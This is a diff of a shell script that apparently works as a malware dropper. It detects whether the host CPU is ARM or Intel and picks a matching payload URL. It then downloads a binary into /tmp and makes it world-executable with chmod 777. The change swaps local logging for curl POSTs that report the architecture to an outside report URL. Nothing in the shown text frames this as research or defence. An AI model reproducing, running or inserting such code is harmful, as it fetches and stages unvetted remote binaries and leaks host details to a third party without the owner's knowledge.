@@ -8,10 +8,10 @@ arch=`cat /proc/cpuinfo|grep -i -c ARM`
 echo $arch
 if [ $arch != 0 ];then
     pl_url=$arm_url
-    echo "ARM " >/tmp/tmplog60920.log
+    curl -X POST $report_url -d "ARM"
 else 
     pl_url=$intel_url
-    echo "Intel " >/tmp/tmplog60920.log
+    curl -X POST $report_url -d "NotARM"
 fi
 curl -s -o /tmp/run985757.bin $pl_url 1>>/tmp/tmplog60920.log 2>&1
 chmod 777 /tmp/run985757.bin 1>>/tmp/tmplog60920.log 2>&1
